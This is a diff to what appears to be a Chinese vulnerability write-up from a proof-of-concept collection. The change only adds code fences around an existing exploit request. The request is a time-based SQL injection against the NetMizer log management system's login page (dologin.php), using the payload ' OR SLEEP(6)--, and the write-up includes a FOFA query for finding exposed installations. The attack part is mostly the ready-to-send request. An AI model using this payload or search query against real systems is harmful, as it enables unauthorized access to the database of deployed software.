@@ -81,6 +81,7 @@ FOFA：app="NetMizer-日志管理系统"
 
 POC/EXP：
 
+```http
 POST /data/login/dologin.php HTTP/1.1
 Host: 127.0.0.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
@@ -92,6 +93,7 @@ Accept-Language: zh-CN,zh;q=0.9
 Content-Length: 57
 
 action=login&username='%20OR%20SLEEP(6)--%20qAZp&passwd=1
+```
 
 ![image-20250304151633278](./.resource/NetMizerdologin.phpsql注入漏洞XVE-2024-37672/media/image-20250304151633278.png)
 
